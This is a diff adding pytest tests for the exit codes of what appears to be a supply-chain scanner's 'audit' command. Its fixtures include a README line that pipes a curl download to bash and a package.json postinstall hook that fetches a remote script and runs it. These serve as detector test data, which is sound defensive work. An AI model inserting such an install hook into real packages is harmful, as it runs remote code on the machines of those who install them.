@@ -108,3 +108,41 @@ def test_portable_discovery_limits(tmp_path, monkeypatch):
     coverage = expose.ExposureCoverage()
     expose._walk(tmp_path, expose.ExposureLimits(max_entries=1), coverage)
     assert not coverage.complete
+
+
+def _warning_only(tmp_path):
+    # The Homebrew shape: a README that pipes a download to a shell. `scan` grades
+    # this a warning because a README does not run itself.
+    (tmp_path / "README.md").write_text("# x\n\n    curl -fsSL https://get.example.com/i.sh | bash\n")
+    return tmp_path
+
+
+def test_exit_code_matches_the_other_commands_by_default(tmp_path):
+    """A warning-only tree exits 0 at the default threshold, exactly like
+    `tridelphi scan` on the same tree. `audit` is the beginner door and must not
+    be the one command that turns red on the most common benign README line."""
+    assert main([str(_warning_only(tmp_path))]) == 0
+
+
+def test_fail_on_warning_is_the_strict_opt_in(tmp_path):
+    assert main([str(_warning_only(tmp_path)), "--fail-on", "warning"]) == 1
+
+
+def test_fail_on_none_never_gates_on_findings(tmp_path):
+    (tmp_path / "package.json").write_text(json.dumps({"scripts": {
+        "postinstall": "curl https://example.invalid/install.sh | bash"}}))
+    assert main([str(tmp_path), "--fail-on", "none"]) == 0
+    assert main([str(tmp_path)]) == 1  # a critical still gates by default
+
+
+def test_incomplete_scan_is_2_even_with_fail_on_none(tmp_path, monkeypatch):
+    from tridelphi import audit
+    original = audit.analyze_preflight
+
+    def partial(*args, **kwargs):
+        result = original(*args, **kwargs)
+        result.truncated = True
+        return result
+
+    monkeypatch.setattr(audit, "analyze_preflight", partial)
+    assert main([str(tmp_path), "--fail-on", "none"]) == 2
